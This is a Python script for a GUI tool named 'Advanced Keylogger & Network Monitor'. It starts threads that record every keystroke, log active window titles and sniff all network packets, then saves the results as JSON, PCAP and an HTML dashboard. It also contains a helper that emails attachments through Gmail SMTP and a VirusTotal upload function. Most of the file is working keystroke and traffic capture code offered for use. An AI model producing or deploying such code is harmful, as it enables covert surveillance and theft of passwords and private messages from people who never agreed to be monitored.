import os
import threading
import time
import numpy as np
import pygetwindow as gw
import scapy.all as scapy
import json
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

# Globals
window_data = []
keylogger_data = []
captured_packets = []
monitoring_threads = []
monitoring_active = False
stop_event = threading.Event()

VIRUSTOTAL_API_KEY = 'Enter your API Key'


def monitor_windows():
    while not stop_event.is_set():
        active_window = gw.getActiveWindow()
        if active_window:
            title = active_window.title
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            window_data.append({"timestamp": timestamp, "window_title": title})
        time.sleep(2)


def start_keylogger():
    from pynput import keyboard

    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        keylogger_data.append({"timestamp": timestamp, "key": key_char})

    def on_release(key):
        if stop_event.is_set():
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def monitor_network():
    def process_packet(packet):
        captured_packets.append(packet)

    while not stop_event.is_set():
        scapy.sniff(prn=process_packet, store=False, timeout=1)


def save_pcap():
    if captured_packets:
        filename = f"network_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        scapy.wrpcap(filename, captured_packets)
        return filename
    return None


def send_email_with_attachment(sender, password, recipient, subject, body, attachment_path):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    with open(attachment_path, 'rb') as f:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
        msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender, password)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"[EMAIL ERROR] {e}")
        return False


def scan_file_virustotal(filepath):
    with open(filepath, 'rb') as f:
        files = {'file': (os.path.basename(filepath), f)}
        headers = {'x-apikey': VIRUSTOTAL_API_KEY}
        response = requests.post('https://www.virustotal.com/api/v3/files', files=files, headers=headers)
        if response.status_code == 200:
            analysis_id = response.json()['data']['id']
            return f"https://www.virustotal.com/gui/file-analysis/{analysis_id}"
        return "Upload failed"


def save_logs_and_generate_web(pcap_file):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    json_filename = f"logs_{timestamp}.json"
    html_filename = f"logs_view_{timestamp}.html"

    all_logs = {
        "window_data": window_data,
        "keylogger_data": keylogger_data,
        "pcap_file": pcap_file
    }
    with open(json_filename, 'w', encoding='utf-8') as jf:
        json.dump(all_logs, jf, indent=2)

    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Log Monitoring Dashboard</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
    body {{ background-color: #0f0f0f; color: #39ff14; font-family: monospace; }}
    table {{ color: white; }}
    .container {{ margin-top: 20px; }}
</style>
</head>
<body>
<div class="container">
    <h1 class="text-success">🔍 Monitoring Dashboard</h1>
    <hr/>
    <h3>📁 PCAP Download</h3>
    {f'<a href="{pcap_file}" class="btn btn-outline-success">Download PCAP</a>' if pcap_file else '<p>No PCAP file captured.</p>'}
    
    <h3>🪟 Window Activity</h3>
    <table class="table table-dark table-striped"><thead><tr><th>Timestamp</th><th>Title</th></tr></thead><tbody>
    {''.join(f'<tr><td>{log['timestamp']}</td><td>{log['window_title']}</td></tr>' for log in window_data)}
    </tbody></table>

    <h3>⌨️ Keylogs</h3>
    <table class="table table-dark table-striped"><thead><tr><th>Timestamp</th><th>Key</th></tr></thead><tbody>
    {''.join(f'<tr><td>{log['timestamp']}</td><td>{log['key']}</td></tr>' for log in keylogger_data)}
    </tbody></table>

    <h3>🧪 VirusTotal Scanner</h3>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file" class="form-control" required>
        <button type="submit" class="btn btn-outline-warning mt-2">Scan with VirusTotal</button>
    </form>

    <h3 class="mt-4">📤 Send Report via Email</h3>
    <form method="post">
        <input type="email" name="sender" placeholder="Your Email" class="form-control mb-2" required>
        <input type="password" name="password" placeholder="Email Password" class="form-control mb-2" required>
        <input type="email" name="receiver" placeholder="Recipient Email" class="form-control mb-2" required>
        <button class="btn btn-outline-primary">Send Logs</button>
    </form>
</div>
</body>
</html>
    """

    with open(html_filename, 'w', encoding='utf-8') as hf:
        hf.write(html_content)

    return json_filename, html_filename


def create_gui():
    def start_detection():
        global monitoring_active, stop_event, window_data, keylogger_data, captured_packets

        if not monitoring_active:
            window_data = []
            keylogger_data = []
            captured_packets = []
            stop_event.clear()
            monitoring_active = True

            monitoring_threads.clear()
            monitoring_threads.append(threading.Thread(target=monitor_windows, daemon=True))
            monitoring_threads.append(threading.Thread(target=start_keylogger, daemon=True))
            monitoring_threads.append(threading.Thread(target=monitor_network, daemon=True))

            for thread in monitoring_threads:
                thread.start()

            messagebox.showinfo("Info", "Monitoring started")
        else:
            messagebox.showwarning("Warning", "Monitoring is already running")

    def stop_detection():
        global monitoring_active, stop_event

        if monitoring_active:
            stop_event.set()
            monitoring_active = False
            for thread in monitoring_threads:
                thread.join(timeout=3)

            pcap_file = save_pcap()
            json_file, html_file = save_logs_and_generate_web(pcap_file)

            messagebox.showinfo("Monitoring Stopped", 
                f"Logs saved:\nJSON logs: {json_file}\nHTML report: {html_file}\n" +
                (f"PCAP file: {pcap_file}" if pcap_file else "No PCAP captured."))
        else:
            messagebox.showwarning("Warning", "No monitoring active")

    root = tk.Tk()
    root.title("Advanced Monitor")
    root.geometry("400x300")

    tk.Label(root, text="Advanced Keylogger & Network Monitor", font=("Arial", 14)).pack(pady=10)
    tk.Button(root, text="Start Monitoring", width=30, command=start_detection).pack(pady=5)
    tk.Button(root, text="Stop Monitoring & Save Logs", width=30, command=stop_detection).pack(pady=5)

    root.mainloop()


if __name__ == "__main__":
    create_gui()
